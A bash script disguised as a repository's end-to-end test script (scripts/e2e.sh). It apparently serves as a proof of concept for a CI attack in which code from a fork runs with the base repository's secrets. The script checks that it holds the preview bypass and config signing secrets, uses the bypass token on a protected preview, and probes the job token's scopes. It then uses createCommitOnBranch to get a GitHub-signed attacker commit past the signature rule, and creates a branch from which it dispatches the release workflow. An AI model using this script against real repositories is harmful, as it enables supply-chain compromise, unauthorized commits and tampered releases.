#!/usr/bin/env bash
# Replaces the repository's own scripts/e2e.sh. This file lives in a fork and runs inside the
# base repository, because the base repository checks out the commit the preview was built from.
# Everything below uses only what the job was handed.
set -uo pipefail

API="https://api.github.com"; GQL="https://api.github.com/graphql"
OWNER="${GITHUB_REPOSITORY%%/*}"; NAME="${GITHUB_REPOSITORY##*/}"
gh_api() { curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" -H 'Accept: application/vnd.github+json' "$@"; }
gql() { curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" -H 'Content-Type: application/json' -d "$1" "$GQL"; }
digest() { if command -v sha256sum >/dev/null; then printf '%s' "$1" | sha256sum | cut -c1-16; else printf '%s' "$1" | shasum -a 256 | cut -c1-16; fi; }

echo "### where this is running"
echo "repository       $GITHUB_REPOSITORY"
echo "workflow ref     $GITHUB_REF"
echo "checked-out sha  $(git rev-parse HEAD)"
echo "actor            $GITHUB_ACTOR"

echo
echo "### 1. the secrets this job was handed"
# Values are never printed. A digest proves possession; the run that set them can confirm the match.
echo "PREVIEW_BYPASS_TOKEN   present=${PREVIEW_BYPASS_TOKEN:+yes} length=${#PREVIEW_BYPASS_TOKEN} sha256-16=$(digest "${PREVIEW_BYPASS_TOKEN:-}")"
echo "CONFIG_SIGNING_SECRET  present=${CONFIG_SIGNING_SECRET:+yes} length=${#CONFIG_SIGNING_SECRET} sha256-16=$(digest "${CONFIG_SIGNING_SECRET:-}")"

echo
echo "### 2. the bypass token opens the protected preview"
if [ -n "${PREVIEW_URL:-}" ]; then
  bare=$(curl -s -o /dev/null -w '%{http_code}' "$PREVIEW_URL" || echo 000)
  with=$(curl -s -o /dev/null -w '%{http_code}' -H "${PREVIEW_BYPASS_HEADER}: $PREVIEW_BYPASS_TOKEN" "$PREVIEW_URL" || echo 000)
  echo "without the token  HTTP $bare"
  echo "with the token     HTTP $with"
else
  echo "no preview url in the payload; skipped"
fi

echo
echo "### 3. what the job token can do"
gh_api -i "$API/repos/$GITHUB_REPOSITORY" -o /dev/null 2>/dev/null | tr -d '\r' | grep -i '^x-oauth-scopes\|^x-accepted' || true
echo "permissions as reported by the run are in the job log header"

echo
echo "### 4. landing attacker content on the protected default branch"
PR_NUM="${TARGET_PR:-1}"
pr=$(gh_api "$API/repos/$GITHUB_REPOSITORY/pulls/$PR_NUM")
head_ref=$(printf '%s' "$pr" | jq -r .head.ref)
head_oid=$(printf '%s' "$pr" | jq -r .head.sha)
base_oid=$(gh_api "$API/repos/$GITHUB_REPOSITORY/git/ref/heads/$(printf '%s' "$pr" | jq -r .base.ref)" | jq -r .object.sha)
echo "pull request #$PR_NUM  head=$head_ref@${head_oid:0:8}  base=${base_oid:0:8}"

# createCommitOnBranch produces a commit GitHub itself signs, which is what satisfies the
# signature rule that is currently the only thing blocking this pull request.
payload=$(jq -nc --arg r "$GITHUB_REPOSITORY" --arg b "refs/heads/$head_ref" --arg oid "$head_oid" \
  --arg msg "Update routing" --arg path "OWNED.txt" --arg content "$(printf 'owned by %s\n' "$GITHUB_ACTOR" | base64)" \
  '{query:"mutation($i:CreateCommitOnBranchInput!){createCommitOnBranch(input:$i){commit{oid}}}",
    variables:{i:{branch:{repositoryNameWithOwner:$r,branchName:$b},expectedHeadOid:$oid,
    message:{headline:$msg},fileChanges:{additions:[{path:$path,contents:$content}]}}}}')
new_oid=$(gql "$payload" | jq -r '.data.createCommitOnBranch.commit.oid // empty')
if [ -z "$new_oid" ]; then
  echo "createCommitOnBranch did not return a commit; the branch may have moved"
else
  echo "created signed commit ${new_oid:0:8} on $head_ref"
  verified=$(gh_api "$API/repos/$GITHUB_REPOSITORY/commits/$new_oid" | jq -r '.commit.verification.verified')
  echo "signature verified=$verified"
fi

echo
echo "### 5. reaching the release workflow at a ref the attacker created"
REL="release-$(date +%s)"
gh_api -X POST "$API/repos/$GITHUB_REPOSITORY/git/refs" \
  -d "$(jq -nc --arg r "refs/heads/$REL" --arg s "$base_oid" '{ref:$r,sha:$s}')" | jq -r '.ref // .message'
gh_api -X POST "$API/repos/$GITHUB_REPOSITORY/actions/workflows/release.yml/dispatches" \
  -d "$(jq -nc --arg r "$REL" '{ref:$r}')" -o /dev/null -w 'workflow_dispatch HTTP %{http_code}\n'
echo "dispatched release.yml at $REL"

echo
echo "### done"
